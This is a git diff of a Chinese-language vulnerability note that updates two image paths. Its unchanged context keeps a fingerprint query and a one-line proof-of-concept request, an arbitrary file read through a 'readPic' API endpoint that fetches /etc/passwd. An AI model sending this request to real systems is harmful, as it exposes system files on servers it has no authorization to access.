@@ -18,7 +18,7 @@ body="*客户端会小于800*"
 
 登陆页面
 
-![image-20231116141833821](images/image-20231116141833821.png)
+![image-20231116141833821](../.gitbook/assets/image-20231116141833821.png)
 
 poc
 
@@ -26,4 +26,4 @@ poc
 /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
 ```
 
-![image-20231116141852063](images/image-20231116141852063.png)
+![image-20231116141852063](../.gitbook/assets/image-20231116141852063.png)
